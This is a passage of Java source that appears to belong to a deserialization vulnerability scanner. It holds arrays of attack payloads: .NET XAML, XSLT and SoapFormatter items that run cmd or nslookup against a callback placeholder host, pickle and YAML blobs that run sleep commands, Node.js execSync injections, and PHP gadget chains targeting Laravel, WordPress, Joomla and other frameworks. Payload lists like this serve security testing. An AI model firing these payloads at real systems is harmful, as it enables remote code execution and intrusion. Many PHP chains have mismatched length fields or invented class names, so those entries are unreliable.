            // XAML Process Start (ObjectDataProvider direct)
            {"XAML Process Start",
                    "<ObjectDataProvider xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" "
                            + "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" "
                            + "xmlns:d=\"clr-namespace:System.Diagnostics;assembly=system\" "
                            + "MethodName=\"Start\">"
                            + "<ObjectDataProvider.ObjectInstance>"
                            + "<d:Process><d:Process.StartInfo>"
                            + "<d:ProcessStartInfo FileName=\"cmd\" Arguments=\"/c nslookup COLLAB_PLACEHOLDER\"/>"
                            + "</d:Process.StartInfo></d:Process>"
                            + "</ObjectDataProvider.ObjectInstance></ObjectDataProvider>"},
            // NetDataContractSerializer
            {"NetDataContractSerializer",
                    "<?xml version=\"1.0\"?><root xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:x=\"http://www.w3.org/2001/XMLSchema\" "
                            + "i:type=\"System.Diagnostics.Process\" "
                            + "xmlns:d=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\"/>"},
            // XSLT ProcessStartInfo (msxsl:script)
            {"XSLT ProcessStartInfo",
                    "<?xml version=\"1.0\"?><xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" "
                            + "xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" "
                            + "xmlns:user=\"http://test.com\" version=\"1.0\">"
                            + "<msxsl:script language=\"CSharp\" implements-prefix=\"user\">"
                            + "<![CDATA[public string exec(){System.Diagnostics.Process.Start(\"nslookup\","
                            + "\"COLLAB_PLACEHOLDER\");return \"\";}]]></msxsl:script>"
                            + "<xsl:template match=\"/\"><xsl:value-of select=\"user:exec()\"/>"
                            + "</xsl:template></xsl:stylesheet>"},
            // SoapFormatter SSRF
            {"SoapFormatter SSRF",
                    "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                            + "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                            + "<SOAP-ENV:Body>"
                            + "<a1:HttpWebRequest xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Net/System\">"
                            + "<a1:HttpWebRequest.uri>http://COLLAB_PLACEHOLDER/soap</a1:HttpWebRequest.uri>"
                            + "</a1:HttpWebRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>"},
    };

    // PHP deserialization payloads
    static final String[][] PHP_PAYLOADS = {
            {"Generic PHP object", "O:8:\"stdClass\":1:{s:4:\"test\";s:5:\"value\";}"},
            {"Laravel RCE chain", "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":1:{s:9:\"\\0*\\0event\";O:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"\\0*\\0queueResolver\";s:6:\"system\";}}"},
            {"Symfony chain", "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:{s:5:\"files\";a:1:{i:0;s:10:\"/etc/passwd\";}}"},
            {"WordPress PHPObject", "O:21:\"WP_Theme_JSON_Resolver\":1:{s:5:\"theme\";O:8:\"WP_Theme\":1:{s:8:\"template\";s:5:\"admin\";}}"},
            {"Magento chain", "O:38:\"Magento\\Framework\\Simplexml\\Element\":1:{s:4:\"data\";s:28:\"<?xml version=\"1.0\"?><x/>\";}}"},
            {"CakePHP chain", "O:27:\"Cake\\Core\\Plugin\\PluginApp\":1:{s:4:\"path\";s:11:\"/etc/passwd\";}"},
            {"Monolog RCE", "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\\0*\\0socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\\0*\\0handler\";N;s:13:\"\\0*\\0bufferSize\";i:-1;s:9:\"\\0*\\0buffer\";a:1:{i:0;a:2:{i:0;s:2:\"id\";s:5:\"level\";i:100;}}s:8:\"\\0*\\0level\";N;s:14:\"\\0*\\0initialized\";b:1;s:14:\"\\0*\\0bufferLimit\";i:-1;s:13:\"\\0*\\0processors\";a:2:{i:0;s:7:\"current\";i:1;s:6:\"system\";}}}"},
            {"Yii2 RCE", "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"\\0yii\\db\\BatchQueryResult\\0_dataReader\";O:14:\"yii\\db\\Command\":1:{s:6:\"\\0*\\0_db\";O:13:\"yii\\db\\Schema\":0:{}}}"},
            {"Guzzle PSR7", "O:24:\"GuzzleHttp\\Psr7\\Response\":1:{s:6:\"stream\";O:33:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\\0GuzzleHttp\\Psr7\\FnStream\\0methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":1:{s:9:\"\\0*\\0stack\";a:0:{}}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":1:{s:9:\"\\0*\\0stack\";a:0:{}}i:1;s:7:\"resolve\";}}}"},
            {"Drupal RCE", "O:28:\"Drupal\\Core\\Entity\\Entity\":1:{s:12:\"\\0*\\0entityType\";s:4:\"node\";}"},
            {"PHPUnit mock", "O:32:\"PHPUnit\\Framework\\MockObject\\Mock\":1:{s:10:\"invocation\";O:32:\"PHPUnit\\Framework\\MockObject\\Rule\":1:{s:4:\"rule\";s:6:\"system\";}}"},
            {"Slim RCE", "O:18:\"Slim\\Http\\Response\":1:{s:4:\"body\";O:15:\"Slim\\Http\\Body\":1:{s:6:\"stream\";O:33:\"GuzzleHttp\\Psr7\\FnStream\":0:{}}}"},
            {"CodeIgniter4 RCE", "O:44:\"CodeIgniter\\Cache\\Handlers\\FileHandler\":1:{s:8:\"\\0*\\0path\";s:11:\"/etc/passwd\";}"},
            {"ThinkPHP RCE", "O:27:\"think\\process\\pipes\\Windows\":1:{s:34:\"\\0think\\process\\pipes\\Windows\\0files\";a:1:{i:0;O:17:\"think\\model\\Pivot\":0:{};}}"},
    };

    // Python pickle payloads
    static final String[][] PYTHON_PAYLOADS = {
            {"Pickle exec", "gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAVzbGVlcJSFlFKULg=="},
            {"Pickle import", "Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4="},
            {"Pickle subprocess", "gASVLQAAAAAAAACMCnN1YnByb2Nlc3OUjAVjaGVja19vdXRwdXSUk5SMBXNsZWVwlIWUUpQu"},
            {"YAML unsafe load", "ISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbQotIHNsZWVwIDU="},
            {"Pickle os.popen", "gASVKQAAAAAAAACMAnBvc2l4lIwGc3lzdGVtlJOUjA5zbGVlcCA1IDI+L3SFlFKULg=="},
            {"Pickle subprocess.call", "gASVMwAAAAAAAACMCnN1YnByb2Nlc3OUjARjYWxslJOUXZQojAVzbGVlcJSMATWUZYWUUpQu"},
            {"Pickle builtins.eval", "gASVJAAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwNX19pbXBvcnRfXygpkZRSlC4="},
            {"YAML !!python/object", "ISFweXRob24vb2JqZWN0L25ldzpvcy5zeXN0ZW0gW3NsZWVwIDVd"},
            {"Pickle reduce tuple", "Y3Bvc2l4CnN5c3RlbQpwMAooUydzbGVlcCA1JwpwMQp0cDIKUnAzCi4="},
            {"Pickle2 os.system", "gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu"},
            {"Jsonpickle RCE", "eyJweS9yZWR1Y2UiOiBbeyJweS9mdW5jdGlvbiI6ICJvcy5zeXN0ZW0ifSwgeyJweS90dXBsZSI6IFsic2xlZXAgNSJdfV19"},
            {"PyYAML RCE", "ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSBzbGVlcCA1"},
    };

    // Ruby deserialization payloads (Marshal.load / YAML.load gadget chains)
    static final String[][] RUBY_PAYLOADS = {
            // Marshal.load payloads (Base64 encoded)
            {"Ruby ERB template",
                    "BAhvOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNz"
                            + "WwdvOhpHZW06OlN0dWJTcGVjaWZpY2F0aW9uBjoJQG5hbWUiCXNsZWVw"},
            {"Ruby Universal RCE chain",
                    "BAhbCGMVR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRl"
                            + "cGVuZGVuY3lMaXN0BzoLQHNwZWNzWwA="},
            {"Ruby Gem::Installer",
                    "BAhvOhVHZW06Okluc3RhbGxlcgY6CUBnZW1vOhpHZW06OlN0dWJTcGVjaWZpY2F0aW9u"},
            {"Ruby Gem::Requirement",
                    "BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0"},
            // YAML-based payloads
            {"Ruby YAML Gem::Installer",
                    "LS0tICFydWJ5L29iamVjdDpHZW06Okluc3RhbGxlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpT"
                            + "cGVjRmV0Y2hlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpSZXF1aXJlbWVudA=="},
            {"Ruby YAML ERB",
                    "LS0tICFydWJ5L29iamVjdDpFcmI6OlV0aWw6OkNhcHR1cmUKc3JjOiAiPCU9IHN5c3RlbSgn"
                            + "c2xlZXAgNScpICU+Ig=="},
            {"Ruby YAML Psych",
                    "LS0tICFydWJ5L29iamVjdDpHZW06Okluc3RhbGxlcgppOiAhcnVieS9vYmplY3Q6R2VtOjpT"
                            + "dHViU3BlY2lmaWNhdGlvbgoJbmFtZTogc2xlZXA="},
    };

    // Node.js deserialization payloads
    static final String[][] NODEJS_PAYLOADS = {
            // node-serialize IIFE payloads
            {"node-serialize IIFE",
                    "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 18')}()\"}"},
            {"node-serialize require",
                    "{\"rce\":\"_$$ND_FUNC$$_function(){var net=require('net');var cp=require('child_process')}()\"}"},
            // cryo deserialization
            {"cryo prototype pollution",
                    "{\"__cryo_type__\":\"Function\",\"body\":\"return require('child_process').execSync('sleep 18')\"}"},
            // funcster deserialization
            {"funcster RCE",
                    "{\"__js_function\":\"function(){require('child_process').execSync('sleep 18')}\"}"},
            // js-yaml !!js/function
            {"js-yaml function",
                    "!!js/function 'function(){require(\"child_process\").execSync(\"sleep 18\")}'"},
            // node-serialize with Buffer
            {"node-serialize Buffer",
                    "{\"rce\":\"_$$ND_FUNC$$_function(){Buffer.from(require('child_process').execSync('id'))}()\"}"},
            // Prototype pollution leading to RCE
            {"constructor.prototype",
                    "{\"__proto__\":{\"type\":\"Code\",\"value\":\"require('child_process').execSync('sleep 18')\"}}"},
            {"constructor pollution",
                    "{\"constructor\":{\"prototype\":{\"outputFunctionName\":\"x;require('child_process').execSync('sleep 18');x\"}}}"},
    };

    // Additional PHP framework chains
    static final String[][] PHP_FRAMEWORK_PAYLOADS = {
            // Joomla chain
            {"Joomla RCE", "O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:54:\"eval(base64_decode('cGhwaW5mbygpOw=='));JFactory::getConfig();exit\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}"},
            // PrestaShop chain
            {"PrestaShop chain", "O:26:\"Smarty_Internal_Template\":1:{s:5:\"cache\";O:36:\"Smarty_Internal_CacheResource_File\":1:{s:5:\"valid\";b:0;}}"},
            // PHPMailer object injection
            {"PHPMailer RCE", "O:9:\"PHPMailer\":1:{s:17:\"\\0PHPMailer\\0Mailer\";s:8:\"sendmail\";s:13:\"\\0PHPMailer\\0LE\";s:1:\"'\";s:22:\"\\0PHPMailer\\0Sendmail\";s:26:\"/usr/sbin/sendmail -t -i\";}"},
            // Phalcon chain
            {"Phalcon chain", "O:27:\"Phalcon\\Mvc\\Model\\Row\":1:{s:4:\"data\";a:1:{s:2:\"id\";s:11:\"/etc/passwd\";}}"},
            // Zend Framework chain
            {"Zend Framework", "O:30:\"Zend_Log_Writer_Mail\":1:{s:16:\"\\0*\\0_eventsToMail\";a:1:{i:0;s:6:\"system\";}}"},
            // FuelPHP chain
            {"FuelPHP chain", "O:27:\"Fuel\\Core\\Autoloader\":1:{s:8:\"\\0*\\0paths\";a:1:{s:4:\"test\";s:11:\"/etc/passwd\";}}"},
            // phpBB chain
            {"phpBB chain", "O:15:\"phpbb\\db\\driver\":1:{s:11:\"\\0*\\0sql_layer\";s:6:\"system\";}"},
            // Contao chain
            {"Contao chain", "O:29:\"Contao\\CoreBundle\\Routing\":1:{s:4:\"path\";s:11:\"/etc/passwd\";}"},
            // SugarCRM chain
            {"SugarCRM chain", "O:28:\"SugarBean\\Person\\Employee\":1:{s:8:\"\\0*\\0table\";s:6:\"system\";}"},
            // MediaWiki chain
            {"MediaWiki chain", "O:12:\"ArrayObject\":1:{i:0;O:12:\"MWException\":1:{s:4:\"text\";s:4:\"test\";}}"},
            // TCPDF chain
            {"TCPDF chain", "O:5:\"TCPDF\":1:{s:8:\"\\0*\\0file\";s:11:\"/etc/passwd\";}"},
    };
}
